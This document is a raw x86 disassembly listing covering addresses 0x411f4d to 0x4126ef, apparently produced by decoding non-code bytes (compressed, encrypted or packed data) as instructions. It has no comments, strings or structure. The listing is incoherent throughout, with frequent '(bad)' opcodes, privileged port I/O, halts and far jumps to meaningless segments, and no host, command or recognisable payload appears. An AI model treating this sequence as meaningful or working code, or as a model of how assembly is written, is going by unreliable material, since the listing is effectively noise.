  411f4d:	call   0xfd91592e
  411f52:	fbld   TBYTE PTR [ecx+edx*1+0x586d2cd8]
  411f59:	xchg   ecx,eax
  411f5a:	aaa    
  411f5b:	ins    BYTE PTR es:[edi],dx
  411f5c:	mov    WORD PTR [eax],ds
  411f5e:	push   ebp
  411f5f:	cmp    cl,dh
  411f61:	test   eax,0x9ab24de2
  411f66:	and    ebp,ebp
  411f68:	stc    
  411f69:	and    eax,0x194cd0b8
  411f6e:	ror    BYTE PTR [edi-0x6cca147d],cl
  411f74:	mov    dh,0x9a
  411f76:	stos   DWORD PTR es:[edi],eax
  411f77:	mov    ecx,0x8e23e7e2
  411f7c:	jno    0x411f64
  411f7e:	ret    0xfab6
  411f81:	cmp    al,0x30
  411f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f84:	idiv   DWORD PTR [esi-0x78]
  411f87:	aas    
  411f88:	mov    BYTE PTR [edx],bl
  411f8a:	stc    
  411f8b:	xor    al,0x90
  411f8d:	sbb    DWORD PTR [ebp+0x28],esp
  411f90:	fs ins DWORD PTR es:[edi],dx
  411f92:	int3   
  411f93:	push   esi
  411f94:	sar    esp,cl
  411f96:	sub    al,0x19
  411f98:	sbb    BYTE PTR [ecx-0x222d98e9],cl
  411f9e:	es add eax,0x361c57f
  411fa4:	adc    esi,DWORD PTR [eax-0x57]
  411fa7:	or     eax,DWORD PTR [ecx]
  411fa9:	outs   dx,BYTE PTR ds:[esi]
  411faa:	add    BYTE PTR [ebx+0x39b394d3],0x11
  411fb1:	iret   
  411fb2:	inc    ebp
  411fb3:	in     eax,dx
  411fb4:	sahf   
  411fb5:	mov    ds:0xbb152dc,eax
  411fba:	fwait
  411fbb:	mov    bl,al
  411fbd:	xor    al,0x95
  411fbf:	adc    BYTE PTR [esi+0x65d8c0b7],al
  411fc5:	sub    eax,0xc08ca264
  411fca:	(bad)  
  411fcb:	xchg   ebp,eax
  411fcc:	fistp  DWORD PTR [ebx]
  411fce:	dec    edi
  411fcf:	mov    ch,0x9e
  411fd1:	gs out 0x99,eax
  411fd4:	(bad)  
  411fd5:	out    0xed,eax
  411fd7:	pusha  
  411fd8:	int    0x42
  411fda:	and    cl,BYTE PTR [eax-0x6c287aab]
  411fe0:	or     edi,ebp
  411fe2:	out    dx,eax
  411fe3:	mov    eax,ds:0x64665d9a
  411fe8:	out    0xce,eax
  411fea:	aaa    
  411feb:	fimul  WORD PTR [edi+0x5b2dfc1b]
  411ff1:	mov    al,0xd2
  411ff3:	inc    ecx
  411ff4:	pop    ecx
  411ff5:	push   edx
  411ff6:	and    BYTE PTR [edx+ecx*8+0x13],ah
  411ffa:	call   FWORD PTR [edx+0x41]
  411ffd:	shr    DWORD PTR [ebp-0x7a],cl
  412000:	imul   ecx,DWORD PTR [ebx-0x5f],0x7d
  412004:	push   ss
  412005:	dec    eax
  412006:	mov    edx,0x103dde72
  41200b:	scas   al,BYTE PTR es:[edi]
  41200c:	pop    edx
  41200d:	popf   
  41200e:	gs push cs
  412010:	loop   0x411fa6
  412012:	bound  esi,QWORD PTR [ecx]
  412014:	mov    eax,ds:0xb1659806
  412019:	ds push ebp
  41201b:	and    al,0xf7
  41201d:	pop    ecx
  41201e:	inc    eax
  41201f:	add    al,0x3e
  412021:	inc    edi
  412022:	add    bl,BYTE PTR ds:0x14fe4bd8
  412028:	mov    ebp,0x6da5eb72
  41202d:	jg     0x411fd7
  41202f:	jns    0x411fd1
  412031:	or     DWORD PTR [ebp+0x4c],eax
  412034:	repz jecxz 0x41207d
  412037:	test   BYTE PTR [edi],0xab
  41203a:	xor    edx,DWORD PTR [eax]
  41203c:	jb     0x412049
  41203e:	in     al,dx
  41203f:	xchg   ebx,eax
  412040:	sub    BYTE PTR [edi+0x5c],ch
  412043:	adc    ah,BYTE PTR [ecx]
  412045:	jmp    0x412096
  412047:	mov    WORD PTR cs:[edi-0x3402c9b9],?
  41204e:	push   eax
  41204f:	icebp  
  412050:	jo     0x4120cd
  412052:	sbb    dh,BYTE PTR [ecx-0x498f0778]
  412058:	push   ebp
  412059:	daa    
  41205a:	call   0x6f0f:0xec1a041b
  412061:	push   ebp
  412062:	test   DWORD PTR [eax+0x29e6b7e3],0x868d470f
  41206c:	(bad)  
  41206d:	stos   DWORD PTR es:[edi],eax
  41206e:	inc    esi
  41206f:	sbb    esp,DWORD PTR [ebp+0x46b07405]
  412075:	gs inc esp
  412077:	dec    esi
  412078:	rep lods al,BYTE PTR ds:[esi]
  41207a:	out    dx,eax
  41207b:	pop    ecx
  41207c:	xlat   BYTE PTR ds:[ebx]
  41207d:	dec    ebp
  41207e:	jbe    0x412000
  412080:	sub    bl,BYTE PTR [eax+esi*8+0x1d904ef0]
  412087:	hlt    
  412088:	into   
  412089:	inc    eax
  41208a:	jns    0x4120e8
  41208c:	push   0x8dd52993
  412091:	pop    ecx
  412092:	(bad)  
  412093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412094:	leave  
  412095:	or     bl,bh
  412097:	fimul  WORD PTR [esi+0x7f]
  41209a:	add    al,0x81
  41209c:	or     DWORD PTR [esi+0x11dbf44d],0x9f22f7fa
  4120a6:	call   0x7a50a1e3
  4120ab:	mov    eax,0x472c281f
  4120b0:	stc    
  4120b1:	xchg   ebp,eax
  4120b2:	stos   BYTE PTR es:[edi],al
  4120b3:	inc    ebp
  4120b4:	inc    ecx
  4120b5:	ror    DWORD PTR ds:0x43555877,cl
  4120bb:	or     eax,0x6db74f
  4120c0:	fs scas al,BYTE PTR es:[edi]
  4120c2:	fild   QWORD PTR [esi*4-0x362472b9]
  4120c9:	xchg   BYTE PTR [ecx-0x26],dl
  4120cc:	push   cs
  4120cd:	adc    ah,BYTE PTR [eax+0x57]
  4120d0:	sbb    al,0xcc
  4120d2:	hlt    
  4120d3:	imul   ecx,edx,0xa878867d
  4120d9:	or     esp,DWORD PTR [eax+0x3d]
  4120dc:	pop    esp
  4120dd:	in     eax,dx
  4120de:	and    esi,edi
  4120e0:	leave  
  4120e1:	loope  0x4120de
  4120e3:	add    BYTE PTR [eax-0x16],0x1d
  4120e7:	repnz and al,0x5
  4120ea:	sub    BYTE PTR [ebx-0x489ed9bc],dl
  4120f0:	jb     0x4120c7
  4120f2:	je     0x412152
  4120f4:	icebp  
  4120f5:	and    BYTE PTR [esi],bl
  4120f7:	fld    DWORD PTR [eax+0x3a]
  4120fa:	cs dec ebx
  4120fc:	push   ss
  4120fd:	iret   
  4120fe:	add    BYTE PTR [ebp-0x74],0x5
  412102:	adc    eax,0x6112a2d2
  412107:	dec    eax
  412108:	inc    esi
  412109:	mov    al,ds:0x3f447d1a
  41210e:	mov    cl,0xcd
  412110:	add    ch,cl
  412112:	arpl   WORD PTR [eax+ebx*1],cx
  412115:	or     BYTE PTR [eax+ecx*2],bl
  412118:	js     0x412165
  41211a:	push   ebx
  41211b:	imul   ebp,esi,0xffffff80
  41211e:	enter  0xa782,0x56
  412122:	mov    ds:0x4728ada2,al
  412127:	mov    edx,0x1c0138bb
  41212c:	scas   al,BYTE PTR es:[edi]
  41212d:	inc    ebx
  41212e:	jp     0x412186
  412130:	mov    edx,0x1591af14
  412135:	fcomp  DWORD PTR gs:[ebp-0x1b]
  412139:	icebp  
  41213a:	xchg   ebp,eax
  41213b:	pop    ecx
  41213c:	or     eax,DWORD PTR [ebp+0x22]
  41213f:	fnstcw WORD PTR [edx]
  412141:	mov    esi,0xac3344d0
  412146:	cli    
  412147:	clc    
  412148:	add    dl,dh
  41214a:	imul   ebp,DWORD PTR [eax+0x159150ea],0xffffff90
  412151:	(bad)  
  412152:	data16 xor dh,dh
  412155:	jmp    0xcafa:0x86879c28
  41215c:	lahf   
  41215d:	add    bh,BYTE PTR [ecx]
  41215f:	xor    ebx,ebx
  412161:	xchg   ebp,eax
  412162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412163:	xchg   edx,eax
  412164:	cmp    dl,BYTE PTR [esi-0x1582f927]
  41216a:	(bad)  
  41216b:	cld    
  41216c:	adc    eax,0x85a49523
  412171:	cdq    
  412172:	cmp    ecx,esi
  412174:	stos   BYTE PTR es:[edi],al
  412175:	cmc    
  412176:	inc    ebp
  412177:	aam    0xbb
  412179:	ds cdq 
  41217b:	sbb    ebx,DWORD PTR [ebx-0x5e1bf45c]
  412181:	fisttp QWORD PTR [ebp+0x2d]
  412184:	pushf  
  412185:	mov    WORD PTR [edx-0x2e42e44],cs
  41218b:	push   edx
  41218c:	aad    0x77
  41218e:	push   ebx
  41218f:	ja     0x412187
  412191:	or     eax,0xefba5cd0
  412196:	xor    DWORD PTR [ebx+0x56c5886e],ecx
  41219c:	xchg   esp,eax
  41219d:	mov    bh,0xf7
  41219f:	imul   edi,DWORD PTR [edi+0xd],0x15
  4121a3:	sbb    DWORD PTR [eax+0x153759],edi
  4121a9:	mov    edi,0xf5cc3908
  4121ae:	fcom   st(6)
  4121b0:	inc    ebp
  4121b1:	jle    0x412144
  4121b3:	cmp    eax,0x50413f82
  4121b8:	adc    DWORD PTR [edx+edx*2],0x1d
  4121bc:	cld    
  4121bd:	mov    bl,0x1c
  4121bf:	pushf  
  4121c0:	xchg   edx,eax
  4121c1:	push   ebp
  4121c2:	sub    al,0x96
  4121c4:	fldcw  WORD PTR [edi-0x7a2d721a]
  4121ca:	jno    0x4121db
  4121cc:	ficomp DWORD PTR [ecx-0x4]
  4121cf:	rol    BYTE PTR [ecx-0x506ec216],0xa6
  4121d6:	jbe    0x412223
  4121d8:	aas    
  4121d9:	ss jae 0x41224e
  4121dc:	mov    cl,0x80
  4121de:	add    BYTE PTR [edx-0x151b95ef],bl
  4121e4:	(bad)  
  4121e5:	sti    
  4121e6:	(bad)  
  4121e7:	jmp    0x4121b8
  4121e9:	leave  
  4121ea:	push   ecx
  4121eb:	inc    ecx
  4121ec:	inc    ecx
  4121ed:	or     dl,bh
  4121ef:	into   
  4121f0:	sub    ebp,edi
  4121f2:	xchg   esp,eax
  4121f3:	or     ebp,DWORD PTR [ebp+0x79a7b834]
  4121f9:	jle    0x4121dc
  4121fb:	sahf   
  4121fc:	adc    DWORD PTR [edx+0x14],ebp
  4121ff:	inc    edx
  412200:	xchg   ebx,eax
  412201:	mov    esi,0x64465b6a
  412206:	dec    edi
  412207:	ins    BYTE PTR es:[edi],dx
  412208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412209:	xor    al,0x48
  41220b:	pop    ds
  41220c:	xor    esi,ebp
  41220e:	xchg   esp,eax
  41220f:	inc    esp
  412210:	add    BYTE PTR [ecx+0x28],bh
  412213:	inc    edx
  412214:	pop    esi
  412215:	(bad)  
  412216:	aaa    
  412217:	loop   0x4121fb
  412219:	into   
  41221a:	les    eax,FWORD PTR [ebp-0x3acc2c70]
  412220:	stc    
  412221:	xchg   edi,eax
  412222:	icebp  
  412223:	jno    0x412277
  412225:	dec    ebp
  412226:	data16 sbb al,0x25
  412229:	lods   eax,DWORD PTR ds:[esi]
  41222a:	mov    ds:0x6db6f129,al
  41222f:	or     eax,0x264f775
  412234:	push   eax
  412235:	ret    
  412236:	sbb    eax,esi
  412238:	mov    BYTE PTR [eax-0x6b],bh
  41223b:	jmp    0x412232
  41223d:	mov    BYTE PTR [ebp-0x31b4402d],0xb2
  412244:	sbb    BYTE PTR [ebp+0x6ccca553],dl
  41224a:	pop    edi
  41224b:	dec    ebp
  41224c:	in     eax,0xc8
  41224e:	ins    BYTE PTR es:[edi],dx
  41224f:	outs   dx,DWORD PTR ds:[esi]
  412250:	add    al,0xd
  412252:	xchg   edi,eax
  412253:	or     al,bh
  412255:	jae    0x4122d1
  412257:	outs   dx,DWORD PTR ds:[esi]
  412258:	xchg   esp,eax
  412259:	cld    
  41225a:	jmp    FWORD PTR [eax]
  41225c:	mov    ah,0xdf
  41225e:	mov    BYTE PTR [ebx],ch
  412260:	adc    al,0x94
  412262:	cwde   
  412263:	dec    edx
  412264:	sbb    cl,cl
  412266:	sbb    al,0xb2
  412268:	cmp    DWORD PTR [edx],esp
  41226a:	adc    edx,DWORD PTR [esi-0x2b]
  41226d:	cmp    BYTE PTR [edx+0x4e],0x18
  412271:	pop    eax
  412272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412273:	pop    esi
  412274:	xlat   BYTE PTR ds:[ebx]
  412275:	cmp    eax,0x33ad42ba
  41227a:	into   
  41227b:	push   esi
  41227c:	(bad)  
  41227d:	call   0x9f6e:0x5c1ea758
  412284:	and    eax,0x83f45993
  412289:	jno    0x412211
  41228b:	inc    esp
  41228c:	push   es
  41228d:	aaa    
  41228e:	addr16 mov ds:0x6c44,al
  412292:	push   eax
  412293:	push   ax
  412295:	dec    edx
  412296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412297:	pop    ecx
  412298:	sub    bl,0x78
  41229b:	pop    ds
  41229c:	jecxz  0x412301
  41229e:	dec    esp
  41229f:	call   0x94d6:0x88d5c106
  4122a6:	mov    DWORD PTR [edi+0x61],edi
  4122a9:	push   esp
  4122aa:	mov    bl,0x1d
  4122ac:	jecxz  0x412241
  4122ae:	jle    0x412242
  4122b0:	jecxz  0x412318
  4122b2:	push   DWORD PTR [eax]
  4122b4:	mov    DWORD PTR [esi],ebx
  4122b6:	jns    0x412243
  4122b8:	and    eax,0x88a11220
  4122bd:	adc    eax,esp
  4122bf:	jo     0x412283
  4122c1:	mov    bh,0x71
  4122c3:	dec    esp
  4122c4:	mov    edx,ebx
  4122c6:	in     al,dx
  4122c7:	push   ss
  4122c8:	mov    DWORD PTR [ebp-0x5b25d07a],ebp
  4122ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122cf:	or     dh,BYTE PTR [ebx+0xe1f309a]
  4122d5:	mov    ss,WORD PTR [edx+0x7e]
  4122d8:	ret    
  4122d9:	aam    0x7c
  4122db:	ret    
  4122dc:	lds    esi,FWORD PTR [ebx-0x5dd389d2]
  4122e2:	add    ch,BYTE PTR [ebx+0x26]
  4122e5:	std    
  4122e6:	popa   
  4122e7:	sahf   
  4122e8:	loop   0x41234e
  4122ea:	les    ecx,FWORD PTR [ecx-0x78]
  4122ed:	dec    esp
  4122ee:	jmp    0xa4cf4f27
  4122f3:	or     ah,dh
  4122f5:	(bad)  
  4122f6:	mul    DWORD PTR [esi+0x12]
  4122f9:	inc    ebp
  4122fa:	(bad)  
  4122fb:	push   0xffffffae
  4122fd:	dec    esi
  4122fe:	mov    edx,esp
  412300:	and    DWORD PTR [esi],ebx
  412302:	lods   al,BYTE PTR ds:[esi]
  412303:	arpl   WORD PTR [esi+0x15],di
  412306:	or     al,0x8f
  412308:	les    ebp,FWORD PTR [edx-0x69]
  41230b:	lea    di,[esi+0x20]
  41230f:	mov    ecx,0x8962737d
  412314:	(bad)  [ebx+0x31]
  412317:	data16 stos BYTE PTR es:[edi],al
  412319:	icebp  
  41231a:	and    ecx,esi
  41231c:	test   DWORD PTR [ebx+ebp*1+0xe],esp
  412320:	mov    ds:0x7ce2306,al
  412325:	ret    0x3d7a
  412328:	les    esp,FWORD PTR [ecx-0x5b599c7a]
  41232e:	and    DWORD PTR [edi],edi
  412330:	mov    DWORD PTR [eax*8-0x11216afd],eax
  412337:	mov    edi,DWORD PTR [ebx+0x7f]
  41233a:	mov    bl,0xc7
  41233c:	cli    
  41233d:	adc    DWORD PTR ds:0x5c1ef72f,esi
  412343:	fucomip st,st(5)
  412345:	xchg   esi,eax
  412346:	pop    esi
  412347:	dec    esp
  412348:	bound  ecx,QWORD PTR [ecx]
  41234a:	cmp    al,0x41
  41234c:	push   0x358c2832
  412351:	cmp    eax,0xb04bcc07
  412356:	sbb    eax,0x548fe4de
  41235b:	aad    0xd7
  41235d:	int3   
  41235e:	pop    ebx
  41235f:	sbb    DWORD PTR [esi+eax*2+0x2e3640a2],edx
  412366:	jne    0x4123db
  412368:	js     0x41236b
  41236a:	loopne 0x412362
  41236c:	repnz add al,0xab
  41236f:	xchg   ecx,eax
  412370:	mov    esp,0x584c25c
  412375:	push   ds
  412376:	push   cs
  412377:	pop    es
  412378:	inc    esi
  412379:	mov    DWORD PTR [eax],ecx
  41237b:	jg     0x412343
  41237d:	ja     0x412379
  41237f:	repnz in al,dx
  412381:	inc    ebx
  412382:	imul   eax,DWORD PTR [edx-0x24276001],0xe1c01023
  41238c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41238d:	aad    0x8
  41238f:	xchg   BYTE PTR [ecx-0x76],dh
  412392:	xor    dh,bh
  412394:	push   ebx
  412395:	rol    eax,cl
  412397:	push   ss
  412398:	mov    BYTE PTR [ebp+ecx*1+0x72],ah
  41239c:	xchg   esp,eax
  41239d:	xor    al,0x51
  41239f:	jmp    0x3ea5:0xd2a10791
  4123a6:	bound  ebp,QWORD PTR [esi]
  4123a8:	popf   
  4123a9:	inc    edi
  4123aa:	dec    esp
  4123ab:	add    esi,DWORD PTR [eax]
  4123ad:	cmp    eax,0x51268bdf
  4123b2:	pusha  
  4123b3:	cmp    DWORD PTR [ebx+eax*1],ebp
  4123b6:	xor    al,0xcf
  4123b8:	pop    edx
  4123b9:	jno    0x41235b
  4123bb:	pop    es
  4123bc:	fcom   st(3)
  4123be:	sbb    DWORD PTR [eax],ebp
  4123c0:	(bad)  
  4123c1:	ror    DWORD PTR [eax+0x57],0xfc
  4123c5:	mov    ebp,0xbcfba95
  4123ca:	mov    cl,0xd9
  4123cc:	push   esi
  4123cd:	dec    edx
  4123ce:	jae    0x412425
  4123d0:	xchg   edx,eax
  4123d1:	adc    bh,0xad
  4123d4:	mov    bl,0xb5
  4123d6:	ins    DWORD PTR es:[edi],dx
  4123d7:	dec    edx
  4123d8:	mov    cl,0xce
  4123da:	repnz scas eax,DWORD PTR es:[edi]
  4123dc:	cdq    
  4123dd:	bound  edi,QWORD PTR [esp+ebp*2-0x76]
  4123e1:	gs jecxz 0x4123af
  4123e4:	mov    bh,0xde
  4123e6:	ds inc edi
  4123e8:	cmp    ecx,DWORD PTR [edi-0x42]
  4123eb:	inc    eax
  4123ec:	add    eax,0x637f946b
  4123f1:	cmp    al,0x77
  4123f3:	adc    cl,cl
  4123f5:	inc    esi
  4123f6:	out    dx,eax
  4123f7:	dec    esp
  4123f8:	mov    esp,edi
  4123fa:	dec    ebp
  4123fb:	inc    esp
  4123fc:	mov    bh,0x94
  4123fe:	(bad)  
  4123ff:	cmp    al,0x3b
  412401:	mov    esp,0x45ce45fd
  412406:	mov    ch,0xc7
  412408:	nop
  412409:	add    eax,0x12919074
  41240e:	or     DWORD PTR [edx+ebx*8],0xc6774fa1
  412415:	mov    ch,0xf8
  412417:	cmp    eax,0x2b94d547
  41241c:	sbb    BYTE PTR [edx+0x6fbd385],dl
  412422:	xor    al,0xc5
  412424:	loop   0x412449
  412426:	cmp    ebp,esp
  412428:	in     eax,dx
  412429:	inc    eax
  41242a:	jb     0x412429
  41242c:	xchg   ebx,eax
  41242d:	jne    0x41241f
  41242f:	mov    DWORD PTR [ebp-0x3f098edb],eax
  412435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412436:	cmp    ebp,DWORD PTR [eax+esi*4+0x78abf6a1]
  41243d:	enter  0x84ed,0xcb
  412441:	sub    ebx,DWORD PTR [ecx-0xd]
  412444:	sub    DWORD PTR [esi],eax
  412446:	and    BYTE PTR [ebx],dh
  412448:	out    dx,eax
  412449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41244a:	sub    al,0x41
  41244c:	int    0x57
  41244e:	mov    al,0xef
  412450:	sbb    DWORD PTR [edi],ebp
  412452:	xchg   ebx,eax
  412453:	rcl    dh,cl
  412455:	retf   0x993e
  412458:	outs   dx,DWORD PTR ds:[esi]
  412459:	cmc    
  41245a:	sub    DWORD PTR [ebx+ebx*4+0x7b8f0148],0xd6eb21b3
  412465:	das    
  412466:	stos   BYTE PTR es:[edi],al
  412467:	mov    ch,0x37
  412469:	arpl   WORD PTR [esi-0x2e5a7718],bp
  41246f:	pusha  
  412470:	mov    dl,0x7e
  412472:	mov    dl,0x49
  412474:	xor    al,0x5d
  412476:	leave  
  412477:	jg     0x4124d8
  412479:	out    0x3a,al
  41247b:	cmp    cl,BYTE PTR [ebp+0x38977658]
  412481:	in     eax,0xa0
  412483:	aad    0x3c
  412485:	xor    DWORD PTR [esi-0x1d],esi
  412488:	dec    esp
  412489:	jbe    0x4124be
  41248b:	call   0x4f8a0bad
  412490:	add    BYTE PTR [eax],0x23
  412493:	outs   dx,DWORD PTR ds:[esi]
  412494:	and    DWORD PTR [esi+edx*2],edi
  412497:	lahf   
  412498:	or     edi,DWORD PTR [edx-0x5e0cdb46]
  41249e:	sahf   
  41249f:	sbb    DWORD PTR [esi+0x5894dcfe],edi
  4124a5:	lods   eax,DWORD PTR ds:[esi]
  4124a6:	leave  
  4124a7:	das    
  4124a8:	mov    ah,0xaf
  4124aa:	sbb    bh,al
  4124ac:	xchg   DWORD PTR [edx+0x75],esp
  4124af:	out    dx,al
  4124b0:	mov    ds,WORD PTR ds:0xf9abbd07
  4124b6:	adc    BYTE PTR ds:0x8409a038,ah
  4124bc:	sbb    BYTE PTR [edx+0x117d7fb4],bl
  4124c2:	push   es
  4124c3:	adc    edi,ebp
  4124c5:	dec    ebx
  4124c6:	jne    0x41251f
  4124c8:	push   0xd5ffc2d0
  4124cd:	jo     0x4124b4
  4124cf:	pop    edi
  4124d0:	sub    BYTE PTR [eax+ecx*1],al
  4124d3:	ret    0x6d6
  4124d6:	mov    ds:0x123e534d,al
  4124db:	fcompp 
  4124de:	jmp    0x41249d
  4124e0:	js     0x4124ca
  4124e2:	sub    BYTE PTR [edx-0x4da0acc6],0x5e
  4124e9:	jne    0x412479
  4124eb:	rcr    DWORD PTR [ebx+0x40693c69],0xeb
  4124f2:	mov    esi,0x2ff4cd76
  4124f7:	and    dh,BYTE PTR [edi+0x380a4918]
  4124fd:	ffreep st(3)
  4124ff:	dec    edi
  412500:	aam    0x57
  412502:	out    dx,eax
  412503:	lods   al,BYTE PTR ds:[esi]
  412504:	ret    
  412505:	lahf   
  412506:	test   BYTE PTR [ebx-0xe],bh
  412509:	ror    esp,1
  41250b:	push   ebp
  41250c:	es add eax,0xe1de47b3
  412512:	int3   
  412513:	lods   al,BYTE PTR ds:[esi]
  412514:	(bad)  
  412515:	sti    
  412516:	jb     0x412528
  412518:	sbb    eax,0x211b99d7
  41251d:	pop    eax
  41251e:	in     eax,0x94
  412520:	fwait
  412521:	bound  esi,QWORD PTR [edi-0x5f2da7bf]
  412527:	pop    ebx
  412528:	dec    ebx
  412529:	sbb    BYTE PTR [edi+0x33],ch
  41252c:	inc    esi
  41252d:	mov    ch,0x7e
  41252f:	out    0xf5,eax
  412531:	jl     0x412554
  412533:	cmp    DWORD PTR ds:0x8f273407,esp
  412539:	inc    ecx
  41253a:	stos   DWORD PTR es:[edi],eax
  41253b:	and    BYTE PTR [eax-0x65],ah
  41253e:	into   
  41253f:	lock into 
  412541:	int3   
  412542:	push   eax
  412543:	cli    
  412544:	inc    eax
  412545:	add    bh,BYTE PTR [edi]
  412547:	or     eax,0xce042f3f
  41254c:	jns    0x4125b7
  41254e:	int3   
  41254f:	cmp    al,dl
  412551:	add    BYTE PTR [edx-0x56],dl
  412554:	fcom   QWORD PTR [ecx]
  412556:	push   ecx
  412557:	pop    ds
  412558:	ja     0x412566
  41255a:	dec    edi
  41255b:	popf   
  41255c:	dec    esp
  41255d:	and    ch,ah
  41255f:	sub    dh,bl
  412561:	stos   BYTE PTR es:[edi],al
  412562:	xor    al,BYTE PTR [ecx+0x18]
  412565:	dec    eax
  412566:	mov    esp,0x84728834
  41256b:	test   BYTE PTR [edx],al
  41256d:	lods   ax,WORD PTR ds:[esi]
  41256f:	inc    edx
  412570:	test   al,0xb8
  412572:	iret   
  412573:	mov    ebp,edx
  412575:	cs pop ds
  412577:	mov    esi,0x5f3e397c
  41257c:	sbb    ebp,DWORD PTR [eax]
  41257e:	pop    esi
  41257f:	push   edx
  412580:	add    eax,0xebefdd5
  412585:	cmp    DWORD PTR [edi-0x18],ecx
  412588:	das    
  412589:	lds    esi,FWORD PTR [ebp-0x391348a1]
  41258f:	mov    eax,ds:0x154416ff
  412594:	(bad)  
  412596:	adc    DWORD PTR [edx+0x3c4a1f37],ebp
  41259c:	ds into 
  41259e:	gs test bh,ch
  4125a1:	fiadd  DWORD PTR [edx+eax*4]
  4125a4:	push   esp
  4125a5:	lods   al,BYTE PTR ds:[esi]
  4125a6:	inc    ebx
  4125a7:	hlt    
  4125a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125a9:	arpl   cx,ax
  4125ab:	or     cl,BYTE PTR [eax+0x4595f879]
  4125b1:	ret    
  4125b2:	jmp    0x41253e
  4125b4:	mov    BYTE PTR [esi-0xb],0xc9
  4125b8:	fucom  st(0)
  4125ba:	jo     0x41260d
  4125bc:	inc    edx
  4125bd:	pop    esi
  4125be:	sbb    eax,0xaedbc3da
  4125c3:	fs test al,0x50
  4125c6:	call   0x2d3b:0xb23c3b09
  4125cd:	xor    al,0xa5
  4125cf:	test   dl,bl
  4125d1:	call   0xa8c2:0xb9e1bf55
  4125d8:	or     DWORD PTR [edi-0x3d],0xffffff95
  4125dc:	aaa    
  4125dd:	jno    0x41262d
  4125df:	ds test al,0xad
  4125e2:	xchg   ebx,eax
  4125e3:	out    0xb9,al
  4125e5:	push   edx
  4125e6:	loope  0x41263a
  4125e8:	add    edx,ebx
  4125ea:	(bad)  
  4125eb:	sbb    dh,cl
  4125ed:	cwde   
  4125ee:	fstp   QWORD PTR [eiz*2+0x9b3fc0c]
  4125f5:	pop    esi
  4125f6:	iret   
  4125f7:	stc    
  4125f8:	mov    dl,0x81
  4125fa:	in     al,dx
  4125fb:	ds fyl2x 
  4125fe:	test   DWORD PTR [esi],0xad4407db
  412604:	mov    edi,0xfeb0308c
  412609:	mov    edi,0x6c9679bc
  41260e:	adc    DWORD PTR [edx-0x5c168e07],edi
  412614:	ss pushf 
  412616:	inc    edi
  412617:	dec    edx
  412618:	xlat   BYTE PTR fs:[ebx]
  41261a:	shl    dl,0x99
  41261d:	cmp    BYTE PTR [ecx],ah
  41261f:	mov    al,0x8b
  412621:	cmc    
  412622:	or     al,ch
  412624:	mul    DWORD PTR [esi-0xf71e2aa]
  41262a:	stos   BYTE PTR es:[edi],al
  41262b:	bound  esp,QWORD PTR [esi]
  41262d:	test   eax,0xec87f7ee
  412632:	jno    0x4125d1
  412634:	mov    ecx,0x1f854de9
  412639:	sbb    eax,0x1f993547
  41263e:	push   0x31e3a080
  412643:	xchg   ecx,eax
  412644:	out    0xa0,al
  412646:	lods   al,BYTE PTR ds:[esi]
  412647:	jne    0x412680
  412649:	test   eax,0xe9ec2b58
  41264e:	mov    ah,BYTE PTR fs:[eax-0x4f3026ff]
  412655:	les    ecx,FWORD PTR [edi]
  412657:	sbb    DWORD PTR [esi],ebp
  412659:	test   DWORD PTR [ecx+0x70],edx
  41265c:	mov    ebp,edi
  41265e:	mov    bl,BYTE PTR [edx+0x76e1dbb7]
  412664:	sbb    DWORD PTR [edx],edx
  412666:	or     DWORD PTR [ebx],0xffffff9a
  412669:	enter  0x91e6,0xd7
  41266d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41266e:	stos   BYTE PTR es:[edi],al
  41266f:	popf   
  412670:	ja     0x4126d7
  412672:	jp     0x4126ef
  412674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412675:	pop    eax
  412676:	arpl   WORD PTR [edx],bp
  412678:	and    ecx,DWORD PTR [edi+eiz*1]
  41267b:	add    DWORD PTR [edx],ebp
  41267d:	cld    
  41267e:	xor    al,0x17
  412680:	and    dl,BYTE PTR [esp+esi*2]
  412683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412684:	fistp  QWORD PTR [ecx-0x1ff75dd4]
  41268a:	cwde   
  41268b:	xchg   edi,eax
  41268c:	inc    ebp
  41268d:	outs   dx,BYTE PTR ds:[esi]
  41268e:	pop    ebp
  41268f:	or     ebx,DWORD PTR [ebx]
  412691:	addr16 pop ebp
  412693:	push   eax
  412694:	imul   eax,DWORD PTR [edx+edi*2],0x222f3ee7
  41269b:	inc    DWORD PTR [edx]
  41269d:	aas    
  41269e:	sti    
  41269f:	push   edx
  4126a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126a1:	sti    
  4126a2:	sar    DWORD PTR [eax+0x54],0xb5
  4126a6:	adc    al,0x3c
  4126a8:	neg    BYTE PTR [eax]
  4126aa:	loope  0x4126e3
  4126ac:	cmc    
  4126ad:	test   BYTE PTR [edx-0x5da78e94],0x90
  4126b4:	sbb    DWORD PTR [edi+0x28],eax
  4126b7:	in     al,dx
  4126b8:	or     ecx,esp
  4126ba:	fstp   DWORD PTR [edi-0x76]
  4126bd:	cmc    
  4126be:	daa    
  4126bf:	(bad)  
  4126c0:	xchg   esp,eax
  4126c1:	add    eax,0x9ce37741
  4126c6:	pushf  
  4126c7:	sub    ebp,DWORD PTR [ebx]
  4126c9:	sbb    DWORD PTR [esi+ebx*8-0x5f6989c5],ebx
  4126d0:	inc    esi
  4126d1:	arpl   WORD PTR [edx+esi*1],dx
  4126d4:	cwde   
  4126d5:	arpl   WORD PTR [ecx],si
  4126d7:	pop    ebp
  4126d8:	push   ds
  4126d9:	add    ebp,edi
  4126db:	loop   0x4126b1
  4126dd:	xor    eax,0xb4af6b24
  4126e2:	mov    ebx,0x2a2be798
  4126e7:	inc    edi
  4126e8:	fdiv   DWORD PTR [ebx-0xa]
  4126eb:	xchg   edx,eax
  4126ec:	retf   0x548c
  4126ef:	push   cs
